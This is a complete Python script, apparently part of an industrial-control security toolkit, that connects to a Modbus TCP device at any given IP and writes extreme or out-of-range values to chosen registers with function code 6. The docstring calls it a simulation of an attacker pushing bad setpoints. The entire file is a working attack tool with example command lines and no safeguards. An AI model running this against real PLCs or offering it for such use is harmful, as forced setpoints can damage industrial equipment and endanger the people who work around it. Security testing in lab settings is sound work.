#!/usr/bin/env python
"""
write_dangerous.py - Write out-of-range values to Modbus registers.

Writes dangerous/extreme values to specific registers using FC 6
(Write Single Register). Simulates an attacker pushing bad setpoints.

Usage:
    python write_dangerous.py <target_ip> <addr:value> [addr:value ...] [--port PORT] [--unit UNIT]

    python write_dangerous.py 192.168.1.100 100:65535 200:0 300:65535
    python write_dangerous.py 192.168.1.100 50:9999 --port 502 --unit 1

Requires: pip install pymodbus
"""

import argparse
from pymodbus.client import ModbusTcpClient

parser = argparse.ArgumentParser(description="Write dangerous values to Modbus registers")
parser.add_argument("target", help="Target IP")
parser.add_argument("registers", nargs="+", metavar="ADDR:VALUE",
                    help="Register address:value pairs (e.g. 100:65535)")
parser.add_argument("--port", type=int, default=502)
parser.add_argument("--unit", type=int, default=1)
args = parser.parse_args()

pairs = []
for r in args.registers:
    a, v = r.split(":")
    pairs.append((int(a), int(v)))

client = ModbusTcpClient(args.target, port=args.port, timeout=2)
if not client.connect():
    print(f"[!] Cannot connect to {args.target}:{args.port}")
    exit(1)

print(f"[*] Writing dangerous values to {args.target}:{args.port} unit={args.unit}\n")

for addr, value in pairs:
    result = client.write_register(addr, value, slave=args.unit)
    if result.isError():
        print(f"  [-] Reg {addr} <- {value}: FAILED ({result})")
    else:
        print(f"  [+] Reg {addr} <- {value}: written")

client.close()
print("\n[*] Done")
